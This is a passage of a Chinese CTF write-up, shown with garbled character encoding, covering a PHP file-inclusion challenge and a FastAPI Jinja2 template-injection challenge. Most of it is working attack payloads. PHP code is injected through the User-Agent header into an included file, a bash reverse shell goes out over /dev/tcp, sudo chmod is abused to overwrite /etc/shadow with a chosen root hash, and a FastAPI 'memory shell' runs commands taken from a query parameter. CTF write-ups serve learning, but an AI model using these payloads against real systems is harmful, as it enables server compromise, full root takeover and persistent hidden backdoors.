invoke__">system</span>(<span class="string">&#x27;mkdir -- &#x27;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$dir</span>));</span><br><span class="line">&#125;;                                   <span class="comment">//åˆ›å»ºç›®å½•ç”¨çš„å‡½æ•°ï¼Œåé¢æ¥äº†ä¸ªå¯¹&#x27;è¿›è¡Œè½¬ä¹‰çš„å‡½æ•°</span></span><br><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);        <span class="comment">//åˆ›å»ºusers/rand/ç›®å½•å¹¶åˆ‡åˆ°è¿™ä¸ªç›®å½•ï¼Œä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶ç½‘ç«™æ ¹ç›®å½•æŒ‡å‘è¿™ä¸ª</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$userFolder</span> = (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"><span class="variable">$userFolder</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">str_replace</span>([<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;-&#x27;</span>],[<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>],<span class="variable">$userFolder</span>));</span><br><span class="line"><span class="comment">//xffå¯ä»¥æ§åˆ¶åˆ›å»ºçš„ç›®å½•ï¼Œä½†æ˜¯æœ‰æ›¿æ¢ï¼Œbasenameè¿”å›æ–‡ä»¶åéƒ¨åˆ†ï¼Œå¥½åƒè¿™é‡Œæ²¡ä»€ä¹ˆç”¨</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$mkdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$userFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;profile&#x27;</span>,<span class="title function_ invoke__">print_r</span>(<span class="variable">$_SERVER</span>,<span class="literal">true</span>));   <span class="comment">//åˆ›å»ºç›®å½•ï¼Œå¹¶ä¸”åœ¨æˆ‘ä»¬åˆ›å»ºçš„ç›®å½•ä¸‹å†™å…¥ç¯å¢ƒå˜é‡</span></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);       <span class="comment">//å›åˆ°users/rand/</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]=<span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);      <span class="comment">//è¿‡æ»¤ç‚¹</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;&lt;?&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]),<span class="string">&#x27;php&#x27;</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f.*l.*a.*g/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¿™æ¬¡ä¸ä¼šè®©ä½ å¾—é€äº†ï¼&quot;</span>;       <span class="comment">//flagè¢«ä¸¥æ ¼è¿‡æ»¤ï¼Œä¸Šä¸ªç‰ˆæœ¬çš„ä¸èƒ½æ‰“äº†</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å†æƒ³æƒ³?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="keyword">__DIR__</span>);</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;rm -rf users/&#x27;</span>.<span class="variable">$randFolder</span>);     <span class="comment">//åˆ é™¤åˆ›å»ºçš„ç›®å½•</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆåˆ†æå®Œæºç ï¼Œä¸èƒ½ç”¨ç‚¹å’Œphpä¼ªåè®®ï¼Œè¯•äº†ä¸€ä¸‹dataä¼ªåè®®ï¼Œ<code>allow_url_include=0</code>ç›´æ¥é™åˆ¶æ­»äº†è¿œç¨‹åŒ…å«éƒ½ä¸è¡Œäº†ï¼ŒsessionåŒ…å«æš‚ä¸”ä¸è¯´èƒ½ä¸èƒ½è¿‡wafï¼Œæˆ‘ä¼°è®¡<strong>session.upload_progress.enabled</strong>è¿™ä¸ªæ²¡å¼€ï¼Œä¹Ÿæ‰“ä¸äº†ï¼ä¸‹é¢æ‰“ä¸é€šäº†ï¼Œå°±åªèƒ½è€ƒè™‘é…åˆä¸Šé¢ä¸€èµ·æ‰“äº†</p><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p><code>file_put_contents(&#39;profile&#39;,print_r($_SERVER,true));</code>èƒ½ä¸èƒ½åˆ©ç”¨è¿™ä¸ªæ–‡ä»¶å‘¢ï¼Ÿ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: rufeii&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=rufeii/profile&quot;</span><br><span class="line">è¿™ä¸ªä¸è¡Œè‚¯å®šä¼šè¢«æ£€æµ‹åˆ°</span><br><span class="line">curl -i -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; -H &quot;X-Forwarded-For: .&quot; &quot;http://node10.anna.nssctf.cn:20167/?page=profile&quot;ä½†æ˜¯è¿™ä¸ªå°±æ‰“å‡ºæ¥äº†éé¢„æœŸè¯´æ˜¯</span><br></pre></td></tr></table></figure><p>è«åå…¶å¦™ï¼Œæ‰€ä»¥è¯´è¿˜æ˜¯è¦å¤šå»å°è¯•ï¼Œçœ‹ä¼¼ä¸å¯èƒ½å®åˆ™ä¹Ÿæœ‰å¯èƒ½ï¼</p><p>ä¸ºä»€ä¹ˆä¼šå‡ºç°éé¢„æœŸï¼Ÿ</p><p><img src="/images/achieve/2025/11/4.png"></p><p>file_gets_contentsåªä¼šåœ¨å·¥ä½œç›®å½•æ‰¾ï¼</p><p><img src="/images/achieve/2025/11/5.png"></p><p>mkdiræ— æ³•é€’å½’åˆ›å»ºç›®å½•é™¤éä½¿ç”¨-på‚æ•°ã€‚é‚£ä¹ˆå‰é¢çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$randFolder</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line"><span class="variable">$mkdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;users/&#x27;</span>.<span class="variable">$randFolder</span>); </span><br></pre></td></tr></table></figure><p>å°±æ˜¯æ²¡ç”¨çš„ï¼Œè¿™ç‚¹å…¶å®åœ¨æŠ¥é”™ä¸­ä¹Ÿå¯ä»¥ä½“ç°ï¼ç„¶åå¦‚æœxffä¸ºç©ºprofileå°±å†™åœ¨htmlç›®å½•ä¸‹ï¼Œchdir(â€˜..â€™)åˆ°wwwï¼Œæ‰€ä»¥æ­¤æ—¶å·¥ä½œç›®å½•æ˜¯wwwï¼è„šæœ¬ç›®å½•æ˜¯htmlï¼file_gets_contentsåœ¨å·¥ä½œç›®å½•è‚¯å®šæ‰¾ä¸åˆ°profileï¼Œä½†æ˜¯includeä¼šå»è„šæœ¬ç›®å½•æ‰¾ï¼Œæ‰€ä»¥ç›´æ¥ç»•è¿‡ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æŠŠprofileå†™åˆ°äº†è„šæœ¬ç›®å½•å»ï¼ˆ&#x2F;var&#x2F;www&#x2F;html&#x2F;profileï¼‰ï¼Œç„¶åå·¥ä½œç›®å½•ä¸æ˜¯è„šæœ¬ç›®å½•çš„æ—¶å€™å°±å¯ä»¥ç»•è¿‡ï¼åˆ©ç”¨çš„æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°å¤„ç†çš„å·®å¼‚æ€§ï¼</p><h3 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>å‰é¢è¯´åˆ°æ˜¯å› ä¸ºå°‘äº†-på‚æ•°ä¸èƒ½é€’å½’åˆ›é€ ç›®å½•ï¼Œå¯¼è‡´profileå†™åˆ°äº†è„šæœ¬ç›®å½•ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œè‚¯å®šä¸Šé¢çš„æ‰“æ³•å°±å¤±æ•ˆäº†ï¼é‚£ä¹ˆå°±æ˜¯é¢„æœŸçš„æ‰“æ³•ï¼</p><p>é¢„æœŸæ‰“æ³•å°±æ˜¯åˆ©ç”¨è¿™ä¸¤ä¸ªç©æ„å¯¹ä¼ªåè®®æ£€æµ‹å·®å¼‚ï¼</p><blockquote><p>file_get_contenså¯¹dataåè®®çš„æ£€æµ‹data:[<mediatype>][;base64],<data><br>include [åè®®å¤´]:&#x2F;&#x2F;è¿™ä¸ªæ‰èƒ½æ£€æµ‹æˆä¼ªåè®®</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬æŠŠæ–‡ä»¶åå‘½åä¸ºè¿™ç§å½¢å¼æ˜¯ä¸æ˜¯å°±å¯ä»¥è®©<code>file_get_contents</code>è®¤ä¸ºæ˜¯ä¼ªåè®®ï¼Œä½†æ˜¯includeä¼šå»åŒ…å«ï¼æ‰€ä»¥ç”šç‰›è€Œé€¼ä¹‹ï¼</p><p>payloadï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H &quot;X-Forwarded-For: data:,rufeii&quot; -H &quot;User-Agent: &lt;?php system(&#x27;tac /f*&#x27;);?&gt;&quot; &quot;http://node9.anna.nssctf.cn:25670/?page=data:,rufeii/profile&quot;</span><br></pre></td></tr></table></figure><h2 id="ez-fastapi"><a href="#ez-fastapi" class="headerlink" title="ez_fastapi"></a>ez_fastapi</h2><h3 id="éé¢„æœŸ-1"><a href="#éé¢„æœŸ-1" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>è¿™é¢˜çš„éé¢„æœŸæ˜¯å‡ºç½‘åå¼¹shell</p><p>app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> HTMLResponse, JSONResponse</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Environment</span><br><span class="line"><span class="keyword">import</span> uvicorn</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line">Jinja2 = Environment()</span><br><span class="line"></span><br><span class="line">Jinja2 = Environment(</span><br><span class="line">    variable_start_string=<span class="string">&#x27;&#123;&#x27;</span>,</span><br><span class="line">    variable_end_string=<span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.exception_handler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">handler_404</span>(<span class="params">request, exc</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;not found!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> JSONResponse(</span><br><span class="line">        status_code=<span class="number">404</span>,</span><br><span class="line">        content=&#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Not found&quot;</span>&#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say1&#x27;</span>] = <span class="string">&#x27;hello!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.middleware(<span class="params"><span class="string">&#x27;http&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">say_hi</span>(<span class="params">request: Request, call_next</span>):</span><br><span class="line">    response = <span class="keyword">await</span> call_next(request)</span><br><span class="line">    response.headers[<span class="string">&#x27;say2&#x27;</span>] = <span class="string">&#x27;hi!&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hello World&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/shellMe&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">shellMe</span>(<span class="params">username=<span class="string">&quot;Guest&quot;</span></span>):</span><br><span class="line">    Jinja2.from_string(<span class="string">&quot;Welcome &quot;</span> + username).render()</span><br><span class="line">    <span class="keyword">return</span> HTMLResponse(content=<span class="string">&quot;&lt;h1&gt;Welcome!&lt;/h1&gt;&lt;p&gt;Request processed.&lt;/p&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">method_disabled</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> NotImplementedError(<span class="string">&quot;æ­¤è·¯ä¸é€šï¼è¯¥æ–¹æ³•å·²è¢«ç®¡ç†å‘˜ç¦ç”¨ã€‚&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    uvicorn.run(app, host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>ç”±äºæ²¡å›æ˜¾ï¼Œæœ¬åœ°è°ƒæˆæœ‰å›æ˜¾çš„æ–¹ä¾¿æ‰¾ä¸œè¥¿ï¼Œæœ€åexpï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;self.<span class="built_in">_</span><span class="built_in">_</span>dict<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span>TemplateReference<span class="built_in">_</span><span class="built_in">_</span>context.keys()&#125;å…ˆç”¨è¿™ä¸ªçœ‹ä¸‹æœ‰å“ªäº›å†…ç½®çš„ä¸œè¥¿å¯ä»¥ä½¿ç”¨</span><br><span class="line">ç”¨bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;å»å¼¹shell</span><br><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>.os.popen(&#x27;bash -c &quot;bash -i &gt;<span class="built_in">&amp;</span>/dev/tcp/ip/port 0&gt;<span class="built_in">&amp;</span>1&quot;&#x27;).read()&#125;æ³¨æ„urlç¼–ç ä¸€ä¸‹å°±å¥½äº†</span><br></pre></td></tr></table></figure><p>å“ˆå“ˆæ‹¿åˆ°shellä¹‹åflagå°±åœ¨è·Ÿç›®å½•ä¸‹ï¼Œä½†æ˜¯æ²¡æœ‰æƒé™ï¼å…ˆçœ‹ä¸‹èƒ½ä¸èƒ½suidææƒï¼Œä½†æ˜¯æ²¡æœ‰å¥½çš„suidææƒå‘½ä»¤ï¼</p><p>sudo ææƒ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo -lå‘ç°å¯ä»¥ç”¨chmodå‘½ä»¤ææƒï¼Œè¿™æ˜¯ä¸€ä¸ªè®¾ç½®æ–‡ä»¶æƒé™çš„å‘½ä»¤ï¼Œå¯¹äºè¿™é“é¢˜æ¥è¯´æˆ‘ä»¬åªéœ€è¦</span><br><span class="line">chmod 764 /flag å°±å¯ä»¥ç›´æ¥è¯»äº†</span><br><span class="line">æ‹¿ä¸‹æ•´å°æœºå­</span><br><span class="line">chmod 766 /etc/shadow</span><br><span class="line">echo &#x27;root:<span class="built_in">$</span>1<span class="built_in">$</span>flag<span class="built_in">$</span>Qiv1fGuuojJhoMNhwWehP.:18000:0:99999:7:::&#x27; &gt; /etc/shadow</span><br><span class="line">ç„¶åsu rootï¼ˆå¯†ç å°±æ˜¯æˆ‘ä»¬æ”¹çš„rootï¼‰è¿™æ ·å°±æ‹¿ä¸‹äº†</span><br></pre></td></tr></table></figure><p><img src="/images/achieve/2025/11/6.png"></p><h3 id="é¢„æœŸ-1"><a href="#é¢„æœŸ-1" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h3><p>é‚£ä¹ˆè¯´åˆ°éé¢„æœŸæ˜¯å‡ºç½‘æ‰“åå¼¹shellï¼Œé‚£ä¹ˆé¢„æœŸè‡ªç„¶å°±æ˜¯ä¸å‡ºç½‘æ‰“å†…å­˜é©¬å‘—ï¼</p><p>è¿™é‡Œå°±ä¸æ˜¯flaskæ¡†æ¶ä¸‹çš„å†…å­˜é©¬äº†ï¼Œæ˜¯FaskAPIæ¡†æ¶ï¼å‚è€ƒï¼š<a href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI å†…å­˜é©¬çš„ç ”ç©¶ - caterpieçš„å°ç«™</a></p><ol><li>ç»å…¸è·¯çº¿æ‰“è·¯ç”±æ·»åŠ å‡½æ•°</li><li>æ–°è·¯çº¿çš„æ¢ç©¶</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.add_api_route = method_disabled</span><br><span class="line">app.add_middleware = method_disabled</span><br></pre></td></tr></table></figure><p>åªèƒ½æ‰“ç¬¬äºŒç§äº†ï¼Œè¿™æ¬¡å½“å›è„šæœ¬å°å­ï¼æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ï¼Œæ‰“ç®—åé¢ç ”ç©¶ä¸€ä¸‹</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.app.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpayloadæˆ‘åœ¨æœ¬åœ°æ‰“é€šäº†ï¼Œæ”¾åˆ°è¿œç¨‹å°±æ‰“ä¸é€šäº†ï¼åé¢ä¸€æ­¥ä¸€æ­¥fuzzï¼Œå‘ç°æ˜¯ä¸­é—´ä»¶çš„é—®é¢˜ï¼Œå°±ä¸€ä¸ªapp</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;<span class="built_in">_</span><span class="built_in">_</span>main<span class="built_in">_</span><span class="built_in">_</span>&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>bydè¿˜æ˜¯æ‰“ä¸é€šï¼Œè¿˜æ˜¯ä¸€æ­¥æ­¥æµ‹è¯•ï¼Œå‘ç°é¢˜ç›®<code>sys.modules[&#39;__main__&#39;]</code>ä¸‹é¢æ²¡æœ‰appï¼ŒçœŸå¥‡æ€ªï¼Œéš¾é“æ˜¯baoå¸ˆå‚…æŠŠå®ƒåˆ äº†ï¼Ÿåé¢BRå¸ˆå‚…è¯´æ˜¯åœ¨appæ¨¡å—å‹æ ¹å°±ä¸åœ¨mainæ¨¡å—ï¼Œä½†æ˜¯æœ¬åœ°ä¸ºä»€ä¹ˆå¯ä»¥å‘¢ï¼Ÿ</p><p>é™„ä»¶é‡Œé¢è¿˜æœ‰ä¸ªstart.shè¢«æˆ‘å¿½ç•¥äº†</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec uvicorn app:app --host 0.0.0.0 --port 8000</span><br></pre></td></tr></table></figure><p><code>uvicorn</code>ç”¨äºå¯åŠ¨ Uvicorn ASGI æœåŠ¡å™¨ï¼Œ<code>app:app</code>æ ¼å¼æ˜¯<code>module_name:variable_name</code></p><p>æ‰€ä»¥æœ¬è´¨ä¸Šå®ƒæ˜¯é€šè¿‡è¿™ä¸ªèµ·çš„æœåŠ¡ï¼Œæˆ‘æœ¬åœ°å°±æ˜¯è¿è¡Œpythonè„šæœ¬èµ·çš„æœåŠ¡è‡ªç„¶ä¸ä¸€æ ·</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/shellMe?username=&#123;lipsum.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;<span class="built_in">_</span><span class="built_in">_</span>builtins<span class="built_in">_</span><span class="built_in">_</span>&#x27;][&#x27;eval&#x27;](&quot;<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.middleware<span class="built_in">_</span>stack.app.add<span class="built_in">_</span>exception<span class="built_in">_</span>handler(404,lambda request,exc:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;sys&#x27;).modules[&#x27;app&#x27;].app.<span class="built_in">_</span><span class="built_in">_</span>init<span class="built_in">_</span><span class="built_in">_</span>.<span class="built_in">_</span><span class="built_in">_</span>globals<span class="built_in">_</span><span class="built_in">_</span>[&#x27;JSONResponse&#x27;](content=&#123;&#x27;message&#x27;:<span class="built_in">_</span><span class="built_in">_</span>import<span class="built_in">_</span><span class="built_in">_</span>(&#x27;os&#x27;).popen(request.query<span class="built_in">_</span>params.get(&#x27;cmd&#x27;) or &#x27;whoami&#x27;).read()&#125;))&quot;)&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±æ‰“é€šäº†</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>è¿™é“é¢˜è¿˜æ˜¯å¾ˆä¸é”™çš„ï¼Œå¢åŠ äº†æˆ‘å¯¹sstiï¼Œåå¼¹shellï¼Œlinuxææƒï¼Œå†…å­˜é©¬çš„ç†è§£ï¼</p>]]></content>
      
      
      <categories>
          
          <category> èµ›é¢˜ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶åŒ…å« </tag>
            
            <tag> ssti </tag>
            
            <tag> fastapiå†…å­˜é©¬ </tag>
            
            <tag> sudoææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flaskä¸‹çš„å†…å­˜é©¬</title>
      <link href="/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
